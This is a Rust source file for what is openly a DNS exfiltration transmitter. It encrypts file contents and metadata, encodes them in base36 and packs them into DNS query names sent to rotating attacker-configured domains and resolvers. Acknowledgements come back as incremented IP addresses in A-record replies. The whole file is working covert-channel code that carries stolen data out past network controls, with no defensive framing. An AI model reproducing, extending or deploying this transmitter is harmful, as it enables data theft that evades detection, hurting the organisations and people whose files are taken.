use crate::base36;
use crate::config::Config;
use crate::crypto::{derive_key, encrypt};
use crate::metadata::ExfilSession;
use crate::resolver::ResolverPool;
use anyhow::{anyhow, Context, Result};
use rand::Rng;
use std::convert::TryInto;
use std::net::{Ipv4Addr, SocketAddr, UdpSocket};
use std::time::Duration;
use trust_dns_proto::op::{Message, MessageType, OpCode, Query};
use trust_dns_proto::rr::{Name, RData, RecordType};
use trust_dns_proto::serialize::binary::{BinEncodable, BinEncoder};

const LABEL_CAP: usize = 62;
const MAX_LABELS: usize = 2;
const SESSION_TAG_LEN: usize = 3;
const SESSION_TAG_PREFIX: char = 'E';
const COUNTER_WIDTH: usize = 5;
const CHUNK_PREFIX_LEN: usize = 2 + 1 + SESSION_TAG_LEN + 1 + COUNTER_WIDTH + 1; // EX-ID-CHUNK-
const LABEL_DELIM: char = '-';
const COMPLETE_SUFFIX: &str = "COMPLETE";
const FLAG_HEADER: u8 = 0x01;
const HEADER_CHUNK_INDEX: u32 = u32::MAX;
const MAX_FRAME_STRING: usize = LABEL_CAP * MAX_LABELS;

pub struct DnsTransmitter {
    cfg: Config,
    pool: ResolverPool,
    aes_key: [u8; 32],
    last_domain: Option<String>,
    ack_next: Ipv4Addr,
}

impl DnsTransmitter {
    pub fn new(cfg: Config, pool: ResolverPool) -> Self {
        let aes_key = derive_key(cfg.encryption_key);
        let ack_ip = cfg
            .server_ip()
            .parse::<Ipv4Addr>()
            .unwrap_or_else(|_| Ipv4Addr::new(127, 0, 0, 1));
        let ack_next = increment_ip(ack_ip);
        Self {
            cfg,
            pool,
            aes_key,
            last_domain: None,
            ack_next,
        }
    }

    pub fn send_header(&mut self, session: &ExfilSession) -> Result<()> {
        let total_frames: u32 = session
            .total_frames()
            .try_into()
            .map_err(|_| anyhow!("transfer requires too many frames for counter width"))?;
        self.send_frame(session, FrameDescriptor::init(total_frames), None)
    }

    pub fn send_metadata_chunk(&mut self, session: &ExfilSession) -> Result<()> {
        let payload = build_metadata_payload(session);
        self.send_frame(session, FrameDescriptor::chunk(0), Some(&payload))
    }

    pub fn send_chunk(&mut self, session: &ExfilSession, index: usize, chunk: &[u8]) -> Result<()> {
        let frame_index = index
            .checked_add(1)
            .ok_or_else(|| anyhow!("chunk index overflow"))? as u32;
        self.send_frame(session, FrameDescriptor::chunk(frame_index), Some(chunk))
    }

    pub fn send_completion(&mut self, session: &ExfilSession) -> Result<()> {
        self.send_frame(session, FrameDescriptor::complete(), None)
    }

    fn send_frame(
        &mut self,
        session: &ExfilSession,
        descriptor: FrameDescriptor,
        payload: Option<&[u8]>,
    ) -> Result<()> {
        let encoded_payload = match payload {
            Some(bytes) => {
                if bytes.is_empty() {
                    return Err(anyhow!("chunk payload must not be empty"));
                }
                let ciphertext = encrypt(bytes, &self.aes_key).map_err(|e| anyhow!("{e}"))?;
                Some(base36::encode(&ciphertext))
            }
            None => None,
        };

        if descriptor.requires_payload() != encoded_payload.is_some() {
            return Err(anyhow!("chunk frames must include payload data"));
        }

        let qname = self.build_name(session, &descriptor, encoded_payload.as_deref())?;

        let mut last_err = None;
        for attempt in 0..3 {
            let resolver = self.pool.next();
            match self.dispatch(&qname, resolver) {
                Ok(true) => return Ok(()),
                Ok(false) => {
                    last_err = Some(anyhow!(
                        "resolver {} rejected chunk (attempt {})",
                        resolver,
                        attempt + 1
                    ));
                }
                Err(e) => last_err = Some(e),
            }
        }

        Err(last_err.unwrap_or_else(|| anyhow!("failed to send frame")))
    }

    fn dispatch(&self, name: &Name, resolver: SocketAddr) -> Result<bool> {
        let mut msg = Message::new();
        msg.set_id(rand::thread_rng().gen());
        msg.set_message_type(MessageType::Query);
        msg.set_op_code(OpCode::Query);
        msg.set_recursion_desired(true);
        msg.add_query(Query::query(name.clone(), RecordType::A));

        let mut buf = Vec::with_capacity(512);
        let mut encoder = BinEncoder::new(&mut buf);
        msg.emit(&mut encoder)?;

        let socket = UdpSocket::bind((Ipv4Addr::UNSPECIFIED, 0))?;
        socket.set_read_timeout(Some(Duration::from_secs(2)))?;
        socket.send_to(&buf, resolver)?;

        let mut resp_buf = [0u8; 512];
        let (size, _) = socket.recv_from(&mut resp_buf)?;
        let resp = Message::from_vec(&resp_buf[..size])?;

        let ack = resp
            .answers()
            .iter()
            .find_map(|record| match record.data() {
                Some(RData::A(ip)) => Some(ip.0),
                _ => None,
            });

        Ok(matches!(ack, Some(ip) if ip == self.ack_next))
    }

    fn build_name(
        &mut self,
        session: &ExfilSession,
        descriptor: &FrameDescriptor,
        payload: Option<&str>,
    ) -> Result<Name> {
        let frame = self.format_frame_string(session, descriptor, payload)?;
        if frame.len() > MAX_FRAME_STRING {
            return Err(anyhow!("frame exceeds two-label budget"));
        }

        let mut labels = Vec::new();
        let mut idx = 0;
        let bytes = frame.as_bytes();
        while idx < bytes.len() {
            let end = (idx + LABEL_CAP).min(bytes.len());
            let label = std::str::from_utf8(&bytes[idx..end])?.to_string();
            labels.push(label);
            idx = end;
            if labels.len() > MAX_LABELS {
                return Err(anyhow!("frame requires more than {} labels", MAX_LABELS));
            }
        }

        if labels.is_empty() {
            labels.push("0".to_string());
        }

        let domain = self.select_domain();
        let fqdn = format!("{}.{}", labels.join("."), domain);
        Name::from_ascii(fqdn).context("invalid query name")
    }

    fn format_frame_string(
        &self,
        session: &ExfilSession,
        descriptor: &FrameDescriptor,
        payload: Option<&str>,
    ) -> Result<String> {
        let id_token = encode_session_tag(session.session_id);
        let frame = match descriptor.phase {
            FramePhase::Init { total_frames } => {
                let counter = encode_counter(total_frames, COUNTER_WIDTH)?;
                format!("EX{d}{id}{d}{counter}", d = LABEL_DELIM, id = id_token)
            }
            FramePhase::Chunk { chunk_index } => {
                let chunk_token = encode_counter(chunk_index, COUNTER_WIDTH)?;
                let data = payload.ok_or_else(|| anyhow!("chunk frame missing payload"))?;
                let available = MAX_FRAME_STRING.saturating_sub(CHUNK_PREFIX_LEN);
                if data.len() > available {
                    return Err(anyhow!("chunk payload exceeds DNS label budget"));
                }
                format!(
                    "EX{d}{id}{d}{chunk}{d}{data}",
                    d = LABEL_DELIM,
                    id = id_token,
                    chunk = chunk_token,
                    data = data
                )
            }
            FramePhase::Complete => format!(
                "EX{d}{id}{d}{suffix}",
                d = LABEL_DELIM,
                id = id_token,
                suffix = COMPLETE_SUFFIX
            ),
        };

        if frame.len() > MAX_FRAME_STRING {
            return Err(anyhow!("frame exceeds DNS limits"));
        }

        Ok(frame)
    }

    fn select_domain(&mut self) -> String {
        let domains = self.cfg.dns_domains();
        if domains.is_empty() {
            return "example.com".to_string();
        }

        if domains.len() == 1 {
            self.last_domain = Some(domains[0].to_string());
            return domains[0].to_string();
        }

        let mut rng = rand::thread_rng();
        let mut candidates: Vec<&str> = domains.iter().copied().collect();
        if let Some(last) = &self.last_domain {
            candidates.retain(|d| d != last);
            if candidates.is_empty() {
                candidates = domains.iter().copied().collect();
            }
        }

        let choice = candidates[rng.gen_range(0..candidates.len())].to_string();
        self.last_domain = Some(choice.clone());
        choice
    }
}

#[derive(Clone)]
struct FrameDescriptor {
    phase: FramePhase,
}

impl FrameDescriptor {
    fn init(total_frames: u32) -> Self {
        Self {
            phase: FramePhase::Init { total_frames },
        }
    }

    fn chunk(index: u32) -> Self {
        Self {
            phase: FramePhase::Chunk { chunk_index: index },
        }
    }

    fn complete() -> Self {
        Self {
            phase: FramePhase::Complete,
        }
    }

    fn requires_payload(&self) -> bool {
        matches!(self.phase, FramePhase::Chunk { .. })
    }
}

#[derive(Clone, Copy)]
enum FramePhase {
    Init { total_frames: u32 },
    Chunk { chunk_index: u32 },
    Complete,
}

fn build_metadata_payload(session: &ExfilSession) -> Vec<u8> {
    let mut buf = Vec::with_capacity(160);
    buf.push(1); // version
    buf.push(FLAG_HEADER);
    buf.extend_from_slice(&session.session_id.to_le_bytes());
    buf.extend_from_slice(&session.job.job_id.to_le_bytes());
    buf.extend_from_slice(&HEADER_CHUNK_INDEX.to_le_bytes());
    buf.extend_from_slice(&(session.job.total_chunks as u32).to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&(session.job.total_size as u64).to_le_bytes());

    let name_bytes = session.job.file_name.as_bytes();
    let name_len = name_bytes.len().min(63);
    buf.push(name_len as u8);
    buf.extend_from_slice(&name_bytes[..name_len]);

    let note_bytes = session.job.note.as_bytes();
    let note_len = note_bytes.len().min(63);
    buf.push(note_len as u8);
    buf.extend_from_slice(&note_bytes[..note_len]);
    buf
}

fn encode_session_tag(session_id: u32) -> String {
    let digits = SESSION_TAG_LEN.saturating_sub(1);
    if digits == 0 {
        return SESSION_TAG_PREFIX.to_string();
    }
    let max = max_value_for_width(digits);
    let modulus = max.saturating_add(1);
    let normalized = if modulus == 0 {
        session_id
    } else {
        session_id % modulus
    };
    let suffix = encode_base36_fixed(normalized, digits).expect("fixed width encoding");
    format!("{}{}", SESSION_TAG_PREFIX, suffix)
}

fn encode_counter(value: u32, width: usize) -> Result<String> {
    let max = max_value_for_width(width);
    if value > max {
        return Err(anyhow!(
            "value {} exceeds maximum {} for width {}",
            value,
            max,
            width
        ));
    }
    encode_base36_fixed(value, width)
}

fn encode_base36_fixed(value: u32, width: usize) -> Result<String> {
    if width == 0 {
        return Err(anyhow!("width must be greater than zero"));
    }

    let alphabet = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let mut buf = vec![b'0'; width];
    let mut remaining = value;
    for idx in (0..width).rev() {
        buf[idx] = alphabet[(remaining % 36) as usize];
        remaining /= 36;
    }

    if remaining != 0 {
        return Err(anyhow!("value {} does not fit width {}", value, width));
    }

    Ok(String::from_utf8(buf).expect("ascii"))
}

fn max_value_for_width(width: usize) -> u32 {
    36u32.saturating_pow(width as u32).saturating_sub(1)
}

fn increment_ip(ip: Ipv4Addr) -> Ipv4Addr {
    let mut octets = ip.octets();
    for idx in (0..4).rev() {
        if octets[idx] == 255 {
            octets[idx] = 0;
        } else {
            octets[idx] += 1;
            break;
        }
    }
    Ipv4Addr::from(octets)
}
